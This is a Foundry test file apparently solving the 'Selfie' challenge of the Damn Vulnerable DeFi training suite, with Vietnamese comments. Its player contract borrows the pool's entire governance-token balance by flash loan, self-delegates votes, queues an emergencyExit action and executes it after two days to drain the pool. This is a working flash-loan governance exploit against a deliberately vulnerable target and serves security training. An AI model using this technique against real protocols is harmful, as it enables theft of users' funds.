// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";


contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        MyContract myContract = new MyContract(pool, governance, recovery, token);

        myContract.trigger();

        // Gia lap da qua 2 ngay
        vm.warp(block.timestamp + 2 days);

        // Execute action
        myContract.executeAction();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract MyContract is IERC3156FlashBorrower{
    SelfiePool pool;
    SimpleGovernance governance;
    address recovery;
    DamnValuableVotes DVT_token;
    uint256 actionID;

    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    constructor(SelfiePool _pool, SimpleGovernance _governance, address _recovery, DamnValuableVotes _token){
        pool = _pool;
        governance = _governance;
        recovery = _recovery;
        DVT_token = _token;
    }

    // Flash loan
    function trigger() external{
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(DVT_token), TOKENS_IN_POOL, "");
    }

    // Tao votes gia
    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data) external returns (bytes32){
        // Dam bao dc bau
        DVT_token.delegate(address(this));
        // Vote gia doc hai goi ham emergencyExit
        bytes memory malVotesData = abi.encodeWithSignature("emergencyExit(address)", recovery);
        
        // Queue action
        actionID = governance.queueAction(address(pool), 0, malVotesData);

        // Refund flash loan
        IERC20(DVT_token).approve(address(pool), amount + fee);

        // Dinh dang protocol
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    // Goi ham executeAction
    function executeAction() external{
        bytes memory results = governance.executeAction(actionID);
    }
}
// forge test --mp test/selfie/Selfie.t.sol